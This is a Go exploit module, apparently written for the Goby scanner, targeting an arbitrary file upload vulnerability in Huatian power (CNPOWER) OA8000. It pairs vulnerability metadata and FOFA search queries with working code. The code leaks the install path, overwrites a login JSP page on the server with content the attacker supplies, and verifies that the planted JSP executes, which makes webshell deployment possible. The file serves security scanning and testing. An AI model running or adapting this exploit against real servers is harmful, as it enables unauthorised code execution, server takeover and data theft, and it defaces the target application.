package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CNPOWER OA Arbitrary File Upload Vulnerability",
    "Description": "<p>Huatian power collaborative office system combines advanced management ideas, management modes, software technology and network technology to provide users with a low-cost and efficient collaborative office and management platform. Wise managers have achieved good results in strengthening standardized workflow, strengthening team execution, promoting fine management and promoting business growth through the use of Huatian power collaborative office platform.</p><p>There is an arbitrary file upload vulnerability in Huatian power OA. Attackers can upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</p>",
    "Impact": "<p>CNPOWER OA Arbitrary File Upload Vulnerability</p>",
    "Recommendation": "<p>The manufacturer has not provided a vulnerability repair plan. Please pay attention to the update of the manufacturer's homepage:</p><p><a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p>",
    "Product": "Huatian-OA8000",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "Information technology application innovation industry",
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "华天动力 OA 任意文件上传漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。<br></p><p>华天动力OA存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。<br></p>",
            "Recommendation": "<p>目前官方尚未发布安全补丁，请关注厂商更新。<a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p>",
            "Impact": "<p>华天动力 OA 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "信创",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "CNPOWER OA Arbitrary File Upload Vulnerability",
            "Product": "Huatian-OA8000",
            "Description": "<p>Huatian power collaborative office system combines advanced management ideas, management modes, software technology and network technology to provide users with a low-cost and efficient collaborative office and management platform.&nbsp;Wise managers have achieved good results in strengthening standardized workflow, strengthening team execution, promoting fine management and promoting business growth through the use of Huatian power collaborative office platform.<br></p><p>There is an arbitrary file upload vulnerability in Huatian power OA. Attackers can upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.<br></p>",
            "Recommendation": "<p>The manufacturer has not provided a vulnerability repair plan. Please pay attention to the update of the manufacturer's homepage:</p><p><a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p>",
            "Impact": "<p>CNPOWER OA Arbitrary File Upload Vulnerability</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "Author": "toto",
    "Homepage": "http://www.oa8000.com",
    "DisclosureDate": "2022-07-22",
    "References": [
        "http://www.oa8000.com"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "fileContent",
            "type": "input",
            "value": "<%out.println(\"123\");%>",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10485"
}`

	getOAFilePath98234u293 := func(host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewPostRequestConfig("/OAapp/jsp/upload.jsp")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO")
		requestConfig.Data = "------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data; name=\"file\"; filename=\"xxx.xml\"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\nxxx.png\r\n------WebKitFormBoundary5Ur8laykKAWws2QO--\r\n"
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".dat") {
				if path := regexp.MustCompile(`(.*?)Tomcat/webapps/.*?\.dat`).FindStringSubmatch(resp.RawBody); len(path) > 1 {
					return path[1]
				} else if path := regexp.MustCompile(`(.*?)htoadata/appdata/.*?\.dat`).FindStringSubmatch(resp.RawBody); len(path) > 1 {
					return path[1]
				}
			}
		}
		return ""
	}
	exploitUploadFile837276342783 := func(path string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewPostRequestConfig("/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm")
		requestConfig.Data = "------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"EDITFILE\"; filename=\"xxx.txt\"\r\nContent-Type: image/png\r\n\r\n" + fileContent + "\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"newFileName\"\r\n\r\n" + path + "Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--\r\n"
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200
		}
		return false
	}
	checkUploadedFile2398764278 := func(fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, fileContent)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			path := getOAFilePath98234u293(u)
			if path == "" {
				path = "D:/htoa/"
			}
			rand := goutils.RandomHexString(6)
			if exploitUploadFile837276342783(path, "<%out.print(\""+rand+"\");%>", u) {
				return checkUploadedFile2398764278(rand, u)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileContent := ss.Params["fileContent"].(string)
			path := getOAFilePath98234u293(expResult.HostInfo)
			if path == "" {
				path = "D:/htoa/"
			}
			if exploitUploadFile837276342783(path, fileContent, expResult.HostInfo) {
				expResult.Success = true
				expResult.Output = "文件已上传，请访问：/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp"
			}
			return expResult
		},
	))
}
